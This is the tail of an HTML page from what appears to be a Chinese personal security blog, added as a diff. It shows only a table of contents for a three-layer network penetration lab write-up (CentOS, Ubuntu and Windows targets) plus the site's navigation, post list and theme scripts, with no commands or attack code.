+      <div class="article-nav-title">
+        
+          文件包含利用思路
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ICMP隧道模式使用</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+	  
+	</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">靶机环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Centos%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Centos渗透:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">①信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.2.</span> <span class="toc-text">②漏洞探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">③写入一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.</span> <span class="toc-text">④蚁剑连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A4%E5%B0%86%E4%BC%9A%E8%AF%9D%E5%8F%8D%E5%BC%B9%E5%88%B0MSF%E4%B8%AD"><span class="toc-number">2.5.</span> <span class="toc-text">⑤将会话反弹到MSF中</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ubuntu%E6%B8%97%E9%80%8F%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">Ubuntu渗透：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0%E5%88%A9%E7%94%A8%E4%B8%8A%E4%B8%AA%E4%B8%BB%E6%9C%BA%E5%8F%8D%E5%BC%B9%E5%88%B0MSF%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%BB%A7%E7%BB%AD%E7%BD%91%E6%AE%B5%E6%8E%A2%E9%92%88"><span class="toc-number">3.1.</span> <span class="toc-text">①利用上个主机反弹到MSF会话中继续网段探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1%E7%BD%91%E6%AE%B5%E6%B7%BB%E5%8A%A0%E4%B8%8E%E6%9F%A5%E7%9C%8B"><span class="toc-number">3.2.</span> <span class="toc-text">②网段添加与查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2sock%E4%BB%A3%E7%90%86%E5%BC%80%E5%90%AF"><span class="toc-number">3.3.</span> <span class="toc-text">③sock代理开启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3%E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="toc-number">3.4.</span> <span class="toc-text">④利用代理进行扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3%E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE"><span class="toc-number">3.5.</span> <span class="toc-text">④利用代理访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A4web%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">3.6.</span> <span class="toc-text">⑤web漏洞检测与利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A5%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">3.7.</span> <span class="toc-text">⑥后台写入一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A6%E5%B0%86%E4%BC%9A%E8%AF%9D%E5%8F%8D%E5%BC%B9%E5%88%B0MSF%E4%B8%AD"><span class="toc-number">3.8.</span> <span class="toc-text">⑦将会话反弹到MSF中</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">Windows渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0%E5%88%A9%E7%94%A8%E4%B8%8A%E4%B8%AA%E4%B8%BB%E6%9C%BA%E5%8F%8D%E5%BC%B9%E5%88%B0MSF%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%BB%A7%E7%BB%AD%E7%BD%91%E6%AE%B5%E6%8E%A2%E9%92%88-1"><span class="toc-number">4.1.</span> <span class="toc-text">①利用上个主机反弹到MSF会话中继续网段探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1%E7%BD%91%E6%AE%B5%E6%B7%BB%E5%8A%A0%E4%B8%8E%E6%9F%A5%E7%9C%8B-1"><span class="toc-number">4.2.</span> <span class="toc-text">②网段添加与查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2sock%E4%BB%A3%E7%90%86%E5%BC%80%E5%90%AF-1"><span class="toc-number">4.3.</span> <span class="toc-text">③sock代理开启</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3%E5%88%A9%E7%94%A8%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F-1"><span class="toc-number">4.4.</span> <span class="toc-text">④利用代理进行扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A4%E7%9B%B4%E6%8E%A5%E5%B0%9D%E8%AF%95%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">4.5.</span> <span class="toc-text">⑤直接尝试漏洞是否存在</span></a></li></ol></li></ol>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="上一篇: 文件包含利用思路">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/" title="下一篇: ICMP隧道模式使用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/04/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/18/CFS%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C/">CFS三层网络渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/18/ICMP%E9%9A%A7%E9%81%93%E6%A8%A1%E5%BC%8F%E4%BD%BF%E7%94%A8/">ICMP隧道模式使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/vulnhub%E9%9D%B6%E6%9C%BAOs-hackNos-1/">vulnhub靶机Os-hackNos-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/17/Java%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2022 mrfan6
+            </div>
+            <div class="footer-right">
+                <a href="#" target="_blank">mrfan6</a>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="//cdn.bootcdn.net/ajax/libs/require.js/2.3.6/require.js"></script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
